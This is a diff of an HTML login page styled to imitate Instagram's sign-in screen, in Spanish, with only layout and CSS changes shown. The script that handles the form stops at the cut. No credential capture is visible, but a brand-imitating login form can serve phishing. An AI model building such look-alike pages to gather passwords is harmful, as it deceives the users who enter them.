@@ -4,13 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inicio de Sesión - Instagram</title>
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="css/style.css">
 </head>
-<style>body {
+<style>
+
+.containerbody {
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    height: 70vh;
     margin: 0;
     font-family: Arial, sans-serif;
     background-color: #fafafa;
@@ -24,7 +26,7 @@
     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
 }
 
-.logo {
+.logored {
     margin-bottom: 20px;
 }
 
@@ -71,8 +73,9 @@ button:hover {
 }
 </style>
 <body>
+    <div class="containerbody">
     <div class="container">
-        <div class="logo">
+        <div class="logored">
             <img src="img/facebook.png" alt="Instagram Logo">
         </div>
         <form id="login-form">
@@ -88,6 +91,7 @@ button:hover {
             <p class="forgot-password"><a href="#">¿Olvidaste tu contraseña?</a></p>
         </form>
     </div>
+</div>
     <script>
         document.getElementById("login-form").addEventListener("submit", function(event) {
     event.preventDefault();
